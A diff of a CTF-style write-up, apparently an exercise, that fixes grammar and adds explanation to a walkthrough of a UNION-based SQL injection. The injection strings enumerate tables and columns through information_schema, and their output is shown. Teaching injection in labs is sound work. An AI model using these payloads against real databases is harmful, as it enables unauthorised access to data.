@@ -6,7 +6,7 @@ Lets try to search with the id 1
 ```
 ID: 1
 First name: one
-Surname : me
+Surname: me
 ```
 
 We got 3 informations.
@@ -17,7 +17,7 @@ Id 5 give us something interesting.
 ```
 ID: 5
 First name: Flag
-Surname : GetThe
+Surname: GetThe
 ```
 
 When we try a research with 'A' character, we got an error message.
@@ -27,14 +27,17 @@ Unknown column 'A' in 'where clause'
 ```
 
 If we copy that in google, we can find that is a mySQL error.
-So we can try to insert/inject a part of sql request to show the database.
+Usually, seeing that kind of error message is a consequence of bad request construction server-side: the request is
+built directly with user inputs !
+So we can try to insert/inject a part of sql request which will be executed and show datas from the database that
+we are not allowed to access.
 
 _But how and what?_
 
 The UNION command allow us to concat multiple requests.
 To forge our injection we have to put an ID first, follow by UNION and a second command.
 
-A classic in sqli is to use SELECT to display _information_schema.tables_
+A classic sqli part is to use SELECT to display _information_schema.tables_
 
 Lets try something
 ```
@@ -46,9 +49,9 @@ This doesn't work because here, we have to give 2 informations to select to fill
 ```
 1 UNION SELECT table_name, table_schema FROM  information_schema.tables
 ```
-It's work!
+It works!
 
-We got all the tables names and their schemas names:
+We got all the table names and their schema names:
 ```
 ID: 1 UNION SELECT table_name, table_schema FROM  information_schema.tables
 First name: db_default
@@ -72,7 +75,7 @@ Surname : Member_survey
 ```
 
 But here we need the column_name for each table_name or table_schema.</br>
-So lets try this
+So let's try this
 ```
 1 UNION ALL SELECT table_name,column_name FROM information_schema.columns;#
 ```
